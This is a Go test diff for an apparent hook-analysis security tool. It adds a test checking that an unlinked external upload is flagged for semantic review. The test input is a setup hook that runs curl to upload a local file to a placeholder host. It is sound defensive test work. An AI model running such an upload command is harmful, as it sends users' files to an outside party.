@@ -68,8 +68,25 @@ func TestDynamicIncludeLowersCoverage(t *testing.T) {
 	item := analyzedSDK(t, "printf ok\n", sdk.HookSetupProject)
 	item.Diagnostics = append(item.Diagnostics, sdk.Diagnostic{Code: "dynamic-include", Severity: sdk.SeverityWarning, Phase: "include", Message: "dynamic source path"})
 	assessment := finding.AssessSDK(item, finding.AnalyzeSDK(item))
-	if assessment.Coverage.Score != 80 || assessment.Coverage.Commands.Unresolved != 1 {
+	if assessment.Coverage.Score != 75 || assessment.Coverage.Commands.Unresolved != 1 || assessment.Coverage.Semantics.CriticalGaps != 1 {
 		t.Fatalf("dynamic include coverage = %#v", assessment.Coverage)
+	}
+	if assessment.Classification != "requires-semantic-review" {
+		t.Fatalf("dynamic include classification = %q", assessment.Classification)
+	}
+}
+
+func TestUnlinkedExternalSendCreatesSemanticGap(t *testing.T) {
+	t.Parallel()
+
+	item := analyzedSDK(t, "curl --upload-file /tmp/unmodeled.bin https://example.invalid/upload\n", sdk.HookSetupProject)
+	assessment := finding.AssessSDK(item, finding.AnalyzeSDK(item))
+	if assessment.Coverage.Score != 75 || assessment.Coverage.Semantics.DataFlow.Gaps != 1 || assessment.Classification != "requires-semantic-review" {
+		t.Fatalf("unlinked send assessment = %#v", assessment)
+	}
+	gap := assessment.Coverage.Semantics.Gaps[0]
+	if gap.Code != "unlinked-external-send" || gap.OperationID == "" {
+		t.Errorf("semantic gap = %#v", gap)
 	}
 }
 
